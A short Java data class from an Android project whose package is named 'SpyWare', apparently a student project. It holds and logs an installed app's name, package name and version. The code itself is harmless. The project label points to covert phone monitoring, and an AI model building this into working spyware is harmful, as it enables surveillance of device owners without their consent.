package com.BUET_Arbirary.SpyWare;

import android.graphics.drawable.Drawable;
import android.util.Log;

public class PInfo {
    private String appname = "";
    private String pname = "";
    private String versionName = "";
    private int versionCode = 0;
    //private Drawable icon;
    PInfo(String Name,String pacName,String verName,int verCode, Drawable ic)
    {
    	appname=Name;
    	pname=pacName;
    	versionName=verName;
    	versionCode=verCode;
    	//icon=ic;
    }
    public String toString()
    {
    	
    	String s=appname+ "\n" + pname+"\n"+versionName+"\n"+versionCode+"\n";
		return s;
    	
    }
    void prettyPrint() {
        Log.d("TAG",appname + "\t" + pname + "\t" + versionName + "\t" + versionCode);
    }
}